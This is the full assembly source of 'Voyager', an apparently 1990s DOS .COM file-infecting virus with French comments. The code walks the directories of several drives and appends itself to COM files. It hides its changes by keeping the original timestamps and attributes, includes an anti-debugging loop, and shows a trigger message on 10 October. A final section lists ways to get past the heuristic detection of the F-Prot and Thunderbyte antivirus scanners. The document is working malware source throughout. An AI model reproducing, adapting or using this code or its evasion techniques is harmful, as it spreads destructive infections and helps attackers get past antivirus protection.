;****************************************************************************
; VOYAGER (.COM)
;****************************************************************************
; LAST REVISION: 16/11/97
;****************************************************************************
; Virus COM
; Signature: 56 6F 79 61 67 65 72
; A chaque appel: Infecte 1 fichier COM par rep au niveau 2 de c:
;                 Infecte tous les fichiers COM de c:\DOS
;                 Infecte 1 fichier COM par rep au niveau x de y: (sauf si y=c)
;****************************************************************************

.model tiny                                            
;Surtout ne pas mettre .radix x (x=16,32,...)
.code                                                  
org 100h                                                                   
include d:\sources\asm\macros.inc                         
include d:\virus\lib.inc                       
                                                                           
;****************************************************************************
; Programme d'accueil                                                      
; Cette zone de saut sera remplac‚e en m‚moire, aprŠs ex‚cution du virus par
; le code originel stock‚ en code_image.                                   
;****************************************************************************
host:           db      0E9h,02h,00h         ; Jmp au code du virus (virus_start)
                db      '!'                  ; Identifiant de la maladie.  
                ;       ...                  ; Zone du programme non catamin‚e
                ret                          ;                             
;****************************************************************************
; Programme principal du virus (D‚but du virus)                            
;****************************************************************************
virus_start:    ;Save registers      
                SaveRegisters                       
                ;Save DTA
		SaveDTA
		;DS=CS, ES=CS                            
                push    cs                          
                pop     ds
		push	cs
		pop	es
                ;Boucle contre debugage du point d'entr‚e
                Boucle_antidebug
                ;Place offset de virus_start en BP
                call    get_start  ;This is a near call (Push only IP)                   
get_start:      pop     bp
                sub     bp,offset get_start - offset virus_start
                ;Teste si systŠme prot‚g‚ par controlleur d'int‚grit‚
                Antivirus_test ; z=0:Non, z=1:Oui
                jnz     go_on
                jmp	back_to_host
go_on:	        ;Met … 0 le compteur d'infection
;                mov     byte ptr cs:[bp+offset count-offset virus_start],00h
                ;Attaque les fichiers de niveau 2: c:\*.*\*.com
                mov     word ptr cs:[bp+offset usefile-offset virus_start],':c'
                mov     byte ptr cs:[bp+offset usefile-offset virus_start+2],00h
                call    scan_rep2                                                    
		;Recherche valeur al‚atoire (0-60 en DH, 0-100 en DL)
                Find_time
                ;Sauvegarde valeur al‚atoire             
                push    dx
                ;D‚termine le disque cible … partir de DL (0-31) dans usefile
                Wich_disk                                
                ;R‚cupŠre valeur al‚atoire               
                pop     dx                               
                ;Infection de niveau 1, 2 ou 3 selon DL sur disque al‚atoire
                ; 0-40:3 40-80:2 80-100:1
niveau3:        cmp     dl,40            
                jae     niveau2          
                call    scan_rep3        
                jmp     short action     
niveau2:        cmp     dl,80            
                jae     niveau1          
                mov	al,'c' ;Si encore disque c, n'attaque pas
		cmp	al,byte ptr cs:[bp+offset usefile-offset virus_start]
                je	short action		
		call    scan_rep2        
		jmp     short action     
niveau1:        call    scan_rep1        
action:         ;Recherche jour (Jour et mois en DH DL)        
                Find_date                
                ;Teste si 10 octobre               
                cmp     dx,0A0Ah                   
                jnz     short back_to_host ; Saut si <>
                ;Se reveille (Affiche message)    
                mov     dx,bp                      
                add     dx,offset message-offset virus_start
                mov     ah,09h                           
                int     21h                            
back_to_host:   ;Replace l'ancien code stock‚ dans code_image en host:
                mov     ax,word ptr cs:[bp+offset code_image-offset virus_start]
                mov     cx,word ptr cs:[bp+offset code_image-offset virus_start+2]
                mov     bx,offset host ;M‚thode indirecte pour ‚viter Heuristic
                mov     word ptr cs:[bx],ax
                mov     word ptr cs:[bx+2],cx
                ;Restore DTA
		RestoreDTA
		;Restitue ‚tat des registres
	        RestoreRegisters
                ;Place retour … l'hote
                ;Push 100h
                cli
		push	ax
		push	bp
		mov	bp,sp
		mov	word ptr ss:[bp+02],100h
		pop	bp
	        sti
		;End push 100h
                jmp     short virus_end ; Jmp pour ‚viter d‚tection par F-prot
virus_end:      ret     ; Retour (Si 100h dans la pile puis IP, retour … l'hote)
 


;****************************************************************************
; Fonction qui recherche des sous-r‚pertoires dans r‚pertoire en usefile
; Pour chaque sous-r‚pertoire trouv‚, elle appelle scan_rep2
;****************************************************************************
scan_rep3:      ;Recherche de r‚pertoires
                mov     ah,1Ah          ; Place DTA en dta3     
                mov     dx,bp
                add     dx,offset dta3-offset virus_start 
                int     21h                                         
                ;G‚n‚ration de chaine de recherche des r‚pertoires dans usefile
                mov     di,bp                            
                add     di,offset usefile-offset virus_start
                mov     si,bp                            
                add     si,offset dirtofind - offset virus_start
                call    concat                           
                inc     di ;                             
                ;Recherche First (AH=4Eh,CL=Attrib,DX=chaine)
                mov     cx,4E00h                         
                xchg    ax,cx                            
                mov     cl,37h          ; Recherche attributs ADRSH mais pas V
                mov     dx,bp                            
                add     dx,offset usefile-offset virus_start
                int     21h                                 
                or      al,al                               
                jnz     short exit_scan_rep3       ; Saut si pas de r‚pertoires
                jmp     short xxx_found3                    
find_nextrep3:  ;Recherche r‚pertoire suivant              
                mov     ah,1Ah          ; Place DTA en dta3 
                mov     dx,bp                            
                add     dx,offset dta3-offset virus_start
                int     21h                               
                ;Recherche Next                          
                mov     ah,4Fh                            
                int     21h                               
                or      al,al                            
                jnz     short exit_scan_rep3       ; Saut si plus de r‚pertoires
xxx_found3:     test    byte ptr cs:[bp+offset dta3-offset virus_start+15h],10h    ; Test attributs par AND 10h
                jz      short find_nextrep3        ; Saut si ce n'est pas rep
                ;Evite r‚pertoire wi*.* (x:\windows)
                cmp     word ptr cs:[bp+offset fname3-offset virus_start],'IW'     ; Refuse r‚pertoire command
                jz      short find_nextrep3
                ;Inutile de tester .
rep_found3:     ;On reconstruit solution dans usefile             
                mov     byte ptr [di],0            ; Retrouve r‚pertoire
                mov     si,bp                               
                add     si,offset fname3-offset virus_start           ; Nom du r‚pertoire
                call    concat                                     
search_file3:   ;Appelle de scanexe: Usefile contient rep … scanner termin‚e par 0
                push    di                                      
                call    scan_rep2 ; Cherche et attaque (modifie DI et BX)
                pop     di              
                jmp     short find_nextrep3  ; Recommence pour rep suivant
exit_scan_rep3: ret                     
;****************************************************************************
; Fonction qui recherche des sous-r‚pertoires dans r‚pertoire en usefile
; Pour chaque sous-r‚pertoire trouv‚, elle appelle findexe et lance infect
;****************************************************************************
scan_rep2:      ;Recherche de r‚pertoires
                mov     ah,1Ah          ; Place DTA en dta2     
                mov     dx,bp             
                add     dx,offset dta2-offset virus_start 
                int     21h                                         
                ;G‚n‚ration de chaine de recherche des r‚pertoires dans usefile
                mov     di,bp             
                add     di,offset usefile-offset virus_start
                mov     si,bp             
                add     si,offset dirtofind-offset virus_start
                call    concat             
                inc     di          
                ;Recherche First (AH=4Eh,CL=Attrib,DX=chaine)
                mov     cx,4E00h                   
                xchg    ax,cx                      
                mov     cl,37h          ; Recherche attributs ADRSH mais pas V
                mov     dx,bp       
                add     dx,offset usefile-offset virus_start
                int     21h                                 
                or      al,al                      
                jnz     short exit_scan_rep2       ; Saut si pas de r‚pertoires
                jmp     short xxx_found2                   
find_nextrep2:  ;Recherche r‚pertoire suivant
                mov     ah,1Ah          ; Place DTA en dta2
                mov     dx,bp       
                add     dx,offset dta2-offset virus_start
                int     21h                               
                ;Recherche Next                          
                mov     ah,4Fh                            
                int     21h                               
                or      al,al                            
                jnz     short exit_scan_rep2       ; Saut si plus de r‚pertoires
xxx_found2:     test    byte ptr cs:[bp+offset dta2-offset virus_start+15h],10h    ; Test attributs par AND 10h
                jz      short find_nextrep2              
                ;Evite r‚pertoire co*.* (x:\windows\command)
                cmp     word ptr cs:[bp+offset fname2-offset virus_start],'OC'     ; Refuse r‚pertoire command
                jz      short find_nextrep2
                cmp     byte ptr cs:[bp+offset fname2-offset virus_start],'.'     ; Refuse r‚pertoire ..
                jz      short find_nextrep2
rep_found2:     ;On reconstruit solution dans usefile
                mov     byte ptr [di],0            ; Retrouve r‚pertoire
                mov     si,bp       
                add     si,offset fname2-offset virus_start           ; Nom du r‚pertoire
                call    concat                                  
search_file:    ;Appelle de scan_rep1: Usefile contient rep … scanner termin‚e par 0
                push    di                                      
                call    scan_rep1 ; Cherche et attaque (modifie DI et BX)
                pop     di                 
                jmp     short find_nextrep2  ; Recommence pour rep suivant
exit_scan_rep2: ret                 
;****************************************************************************
; Fonction qui recherche un ex‚cutable valide au niveau du r‚pertoire en
; usefile et l'infecte si trouv‚.
;****************************************************************************
scan_rep1:      ;Place le DTA en dta1 (dans la zone de donn‚es du virus)
                mov     ah,1Ah               ; Place DTA en dta1   
                mov     dx,bp       
                add     dx,offset dta1-offset virus_start
                int     21h                                         
                ;G‚n‚ration de chaine de recherche des fichiers dans usefile
                mov     di,bp       
                add     di,offset usefile-offset virus_start
                mov     si,bp       
                add     si,offset filetofind - offset virus_start
                call    concat                                      
                inc     di                   ; On place DI aprŠs le '\'
                mov	byte ptr [di+2],'c'  ; Transforme *.vom en *.com
		;Recherche First (AH=4Eh)                          
                mov     cx,4E00h                                    
                xchg    ax,cx                                       
                mov     cl,27h               ; Attributs ARSH mais pas V ni D
                mov     dx,bp              
                add     dx,offset usefile-offset virus_start
                int     21h                                         
                or      al,al              
                jnz     short exit_scan_rep1 ; Saut si pas de fichiers trouv‚s
                ;On reconstruit solution dans usefile                          
                mov     byte ptr [di],0    
                mov     si,bp              
                add     si,offset fname1-offset virus_start ; Nom du fichier
                call    concat               ; DI n'a pas boug‚          
                ;Teste validit‚ du fichier trouv‚ et infecte                  
                call    file_ok              ; Retour c=0:invalide ou c=1:infect‚
                jnc     short find_nextrep1  ; Saut si non valide
                jmp     short again
find_nextrep1:  ;Recherche Next   
                mov     ah,4Fh                                       
                int     21h                                          
                or      al,al                                        
                jnz     short exit_scan_rep1 ; Saut si plus de fichiers
                ;On reconstruit solution dans usefile
                mov     byte ptr [di],0    
                mov     si,bp              
                add     si,offset fname1-offset virus_start ; Nom du fichier
                call    concat             ; DI n'a pas boug‚
                ;Teste validit‚ du fichier trouv‚ et infecte
                call    file_ok ; Retour c=0:invalide ou c=1:infect‚
                jnc     short find_nextrep1 ; Saut si non valide
again:          cmp     word ptr cs:[bp+offset usefile-offset virus_start+3],'OD'
                jz      short find_nextrep1 ; Si rep x:\do*.*, on recommence
exit_scan_rep1: ret
;****************************************************************************
; Fonction qui concataine une chaine en es:di (premier car.) suivi d'une
; chaine commen‡ant en ds:si (premier car.)   
; En sortie, es:di pointe sur le premier car. … droite de la jonction
;            ds:si pointe le 0 de la chaine destination
;****************************************************************************
concat:         ;Place DI sur le 0 de chaine source
                mov     al,byte ptr es:[di]
                inc     di   
                or      al,al 
                jnz     short concat  ; Boucle jusqu'… fin chaine1
                dec     di      ; DI pointe le 0             
                push    di      ; Sauve DI (N‚cessaire ?)    
concat2:        ;Fusionne                                   
                cld     ; Clear Flag D: SI et DI sont incr‚ment‚s                                                
                lodsb   ; Place ‚l‚ment en DS:SI dans AX (SI incr‚ment‚)
                stosb   ; Place ‚l‚ment dans AX en ES:DI (DI incr‚ment‚)
                or      al,al                                
                jnz     short concat2 ; Boucle jusqu'… fin chaine2
                pop     di            ; R‚cupŠre DI (N‚cessaire ?)
exit_concat:    ret
;****************************************************************************
; Fonction qui d‚termine si un fichier peut ˆtre infect‚
; Entr‚e: Le chemin complet du fichier dans usefile et ses info dans dta1
; BX sert de handler au fichier cible ouvert tout au long de la fonction
; Retourne c=0: invalide ou c=1: infect‚    
;****************************************************************************
file_ok:        cmp     word ptr cs:[bp+offset fname1-offset virus_start],'OC'  ; Refuse fichier command.com
                jz      fok_erreur ; Evite fichier command.com
                cmp     word ptr cs:[bp+offset fname1-offset virus_start],'IW'  ; Refuse fichier win.com
                jz      fok_erreur ; Evite fichier win.com
                call    open_save_attribute  ; Sauve attributs et ouvre
                jnc     short fok_erreur     ; Saut si erreur … l'ouverture
                ;Lit les 4 premiers octets du fichier en les pla‡ant dans start_image
                mov     ah,3Fh               
                mov     cx,4                
                mov     dx,bp
                add     dx,offset start_image-offset virus_start
                int     21h                 
                ;Determine taille du fichier + virus + pile de 100 octets
                mov     ax,word ptr cs:[bp+offset fsize1-offset virus_start]  
                add     ax,offset final - offset virus_start + 100 + 100h
                jc      short fok_nzend      ; Saut si taille > 64ko
                ;D‚termine si en-tˆte ok                                    
                cmp     byte ptr cs:[bp+offset start_image-offset virus_start],0E9h  ; Regarde si Jmp
                jnz     short fok_zend1              ; Saut si pas de Jmp             
                cmp     byte ptr cs:[bp+offset start_image-offset virus_start+3],'!' ; Compare avec '!'
                jz      short fok_nzend              ; Saut si Jmp et '!'
                ;D‚termine si .exe camoufl‚ en .com (En 2 fois pour ‚viter Heuristique)                          
fok_zend1:      cmp     byte ptr cs:[bp+offset start_image-offset virus_start+1],'Z' ; Regarde si 'ZM'
                jnz     short fok_zend2              ; Saut si 'ZM'
                cmp     byte ptr cs:[bp+offset start_image-offset virus_start],'M'   ; Regarde si 'ZM'
                jz      short fok_nzend              ; Saut si 'ZM'
fok_zend2:      call    infect
                call    rest_attribute_close
                stc     ; c=1: Fichier infect‚                                
                ret                                                           
fok_nzend:      call    rest_attribute_close               
fok_erreur:     clc     ; c=0: Erreur ouverture ou fichier invalide           
retour:         ret
;****************************************************************************
; Fonction qui infecte une victime choisie dont le chemin est dans usefile
; Entr‚e: BX qui ne doit pas ˆtre modifi‚
;**************************************************************************** 
infect:         ;Se place a la fin du fichier vis‚                           
                mov     ax,4202h                                              
                xor     cx,cx                                                 
                xor     dx,dx                                                 
                int     21h                                                   
recopie:        ;Copie le code viral de la m‚moire … la suite du fichier cible
                mov     ax,4000H                                              
                mov     cx,offset final - offset virus_start                  
                mov     dx,bp       
                int     21H                                                   
                ;Se place au niveau de code_image de la cible sur disque     
                mov     ax,4200h                                              
                xor     cx,cx                                                 
                mov     dx,word ptr cs:[bp+offset fsize1-offset virus_start]
                add     dx,offset code_image - offset virus_start             
                int     21h                                                   
                ;Ecrit la vrai s‚quence de d‚but qui a ‚t‚ d‚j… lue et plac‚e dans start_image 
                mov     cx,4000h                                                  
                mov     ax,4                  
                xchg    ax,cx                 
                mov     dx,bp
                add     dx,offset start_image-offset virus_start
                int     21h                                                   
                ;Se replace au d‚but du fichier cible                        
                mov     ax,4200h                                              
                xor     cx,cx                                                
                xor     dx,dx                                              
                int     21h                                                   
                ;Place la fausse s‚quence de d‚but d'abord dans start_image
                mov     byte ptr cs:[bp+offset start_image-offset virus_start],0E9h  ; Place l'instruction Jmp
                mov     ax,word ptr cs:[bp+offset fsize1-offset virus_start]         ; Calcule adresse du Jmp
                sub     ax,3           
                mov     word ptr cs:[bp+offset start_image-offset virus_start+1],ax  ; Place adresse du Jmp
                mov     byte ptr cs:[bp+offset start_image-offset virus_start+3],'!' ; Place '!'
                ;Ecrit la fausse s‚quence de start_image au d‚but du fichier victime
                mov     cx,4000h                                                  
                mov     ax,4        
                xchg    ax,cx       
                mov     dx,bp       
                add     dx,offset start_image-offset virus_start
                int     21h         
		;Incr‚mente compteur infection
;		inc     byte ptr cs:[bp+offset count-offset virus_start]
;----------------------------------------------------------------------------
                pushf                       
                push    bx                  
                ;Test si mode DEBUG <>0    
                cmp     byte ptr cs:[bp+offset debug-offset virus_start],00h
                jz      short nodebug
                ;Affiche victime             
                mov     byte ptr cs:[bp+offset usefile-offset virus_start+40],24h
                mov     dx,bp
                add     dx,offset usefile-offset virus_start
                mov     ah,09h
                int     21h                   
nodebug:        pop     bx          
                popf                
;----------------------------------------------------------------------------
exit_infect:    ret          
;****************************************************************************
; Fonction qui ouvre fichier (d‚sactive ses attributs avant)
; Retour: Handle de fichier dans bx  
;         Flag C …  1:Ok  ou  0:Erreur
;**************************************************************************** 
open_save_attribute: ;Ouvre fichier et sauvegarde attributs.
                mov     ax,4300h        ; Fonction 43/00 pour lire attributs
                mov     dx,bp                                            
                add     dx,offset usefile-offset virus_start             
                int     21h                                                         
                mov     byte ptr cs:[bp+offset fattr-offset virus_start],cl ; Sauve cl  
                mov     cx,4301h        ; Fonction 43/01 pour d‚finir attributs     
                xor     ax,ax           ; Aucun attribut … 1
                xchg    ax,cx
                mov     dx,bp                                                       
                add     dx,offset usefile-offset virus_start                        
                int     21h                                                         
                mov     ax,3D02h        ; Ouvre fichier                             
                mov     dx,bp                                                       
                add     dx,offset usefile-offset virus_start                        
                int     21h                                                         
		jc      short fin_erreur_open   ; Si erreur … l'ouverture           
                mov     bx,ax           ; Sauve handle en bx                        
                mov     ax,5700h        ; Fonction pour lire heure et date     
                int     21h                                                         
                mov     word ptr cs:[bp+offset ftime-offset virus_start],cx      ; Sauve heure en m‚moire
                mov     word ptr cs:[bp+offset fdate-offset virus_start],dx      ; Sauve date en m‚moire   
                mov     ax,word ptr cs:[bp+offset fsize1-offset virus_start]     ; Sauve taille en m‚moire
                mov     word ptr cs:[bp+offset fsize-offset virus_start],ax
                mov     ax,word ptr cs:[bp+offset fsize1-offset virus_start+2]
                mov     word ptr cs:[bp+offset fsize-offset virus_start+2],ax
                stc     ; c=1: Pas d'erreur … l'ouverture
                ret                 
;****************************************************************************
; Fonction qui ferme fichier (restaure attributs ensuite)
; Entr‚e: Handle du fichier dans bx
;**************************************************************************** 
rest_attribute_close: ;Restaure attributs et ferme fichier.
                mov     cx,5701h        ; Restaure date et heure
                xchg    ax,cx
                mov     cx,cs:[bp+offset ftime-offset virus_start]
                mov     dx,cs:[bp+offset fdate-offset virus_start]
                int     21h                    
                mov     ah,3Eh          ; Ferme le fichier
                int     21h                    
fin_erreur_open:                           
                mov     cx,4301h        ; Remet anciens attributs
                xchg    ax,cx              
                mov     cl,byte ptr cs:[bp+offset fattr-offset virus_start]
                mov     dx,bp                                 
                add     dx,offset usefile-offset virus_start
                int     21h                
                clc     ; c=0: Erreur ouverture ou fermeture termin‚e (utilis‚ par open_save...)
                ret                          
;****************************************************************************
; Zone du virus o— sont d‚localis‚es les 4 premiers octets
;****************************************************************************
code_image:     nop                          
                nop                          
                nop                          
                nop                          
;****************************************************************************
; Zone de code inutile … supprimer (pour test de d‚tection heuristic)
;****************************************************************************
               
               
               
;****************************************************************************
; Zone de donn‚es incorpor‚e                 
;****************************************************************************
;dta1   Pour recherche fichiers
dta1            db      26 dup (?) 
fsize1          dw      2 dup (?) 
fname1          db      13 dup (?) 
;dta2   Pour recherche r‚pertoires 
dta2            db      26 dup (?) 
fsize2          dw      2 dup (?)
fname2          db      13 dup (?) 
;dta3   Pour recherche r‚pertoires
dta3            db      26 dup (?)
fsize3          dw      2 dup (?)
fname3          db      13 dup (?)
;donn‚es de dta                                       
fattr           db      0          
ftime           dw      0          
fdate           dw      0          
fsize           dd      0                  
;chemin de fichier              
usefile         db      77 dup (?) ;64+'\'+12
usefileend      db      0
;autre                          
;count		db	0 ;Compteur d'infection
start_image     db      0,0,0,0   
dirtofind       db      '\*.*',0        ; Doit commencer par '\' qu'il faut
filetofind      db      '\*.vom',0      ; laisser pour fusions avec chemin
message         db      0Dh,0Ah,'Voyager (.com) is here.',0Dh,0Ah,24h
debug           db      1               ; 0:Non  1:Oui (Affiche victimes)
final:          ; label to fix the end of code to move when virus moves himself
end host                          
                  

                                  
; Valeurs des attributs de fichiers:
;****************************************************************************
; Valeurs attribut fichiers
; 0x00 Normal file, no attributes
; 0x01 Read only attribute
; 0x02 Hidden file      
; 0x04 System file      
; 0x08 Volume label                            
; 0x10 Directory                               
; 0x20 Archive                                 
                                               

                                               
; CritŠres d'invisibilit‚ heuristique aux Anti-Virus
;****************************************************************************
                                               
;Situation 1                                   
;-------------                                 
;mov   ah,4Eh                                  
;...                                           
;int   21h                                     
;-> Caract‚ristique heuristique F: Suspicious File Access
;-> Pour Thunderbyte qui simule pour retrouver chargement de 4Eh dans AH:
;   On cache chargement de AH=4Eh par un jmp entre mov et int (Simulation stopp‚e par jmp)
;-> Pour F-Prot qui recherche chargement de 4Eh dans AH:
;   On charge AH en utilisant CH comme interm‚diaire
                                               
;Situation 2                                   
;-------------                                 
;mov     ah,1Ah  (ou mov ah,40h)               
;mov     dx,80h                                
;int     21h                                   
;-> Caract‚ristique heuristique F: Suspicious File Access
;-> On inverse chargement DX et AH avec xchg   
                                               
;Situation 3                                   
;-------------                                 
;mov     [variable],ax                                                                     
;-> Caract‚ristique heuristique O: Overwrite memory
;-> AccŠs m‚moire indirect (par [bx]) plut“t que direct (mov [variable],ax)                
                                                          
;Situation 4
;-------------                                            
;int    1Ah                                    
;-> Caract‚ristique heuristique St:            
;-> Remplacer par NOP NOP et morpher en CDh 1Ah
;   Une instruction call entre le code modifiant et le code modifi‚ est
;   n‚cessaire pour vider le cache code
               
;Situation 5
;-------------                                            
;push 100h
;ret 
;-> Caract‚ristique heuristique de F-Prot:
;-> Ajouter JMP entre push et ret
               
;Situation 6
;-------------                                            
;call rep    
;rep:   pop bp
;-> Caract‚ristique heuristique de F-Prot:
;-> Introduire boucle aprŠs point d'entr‚e pour bloquer simulateur Antivirus
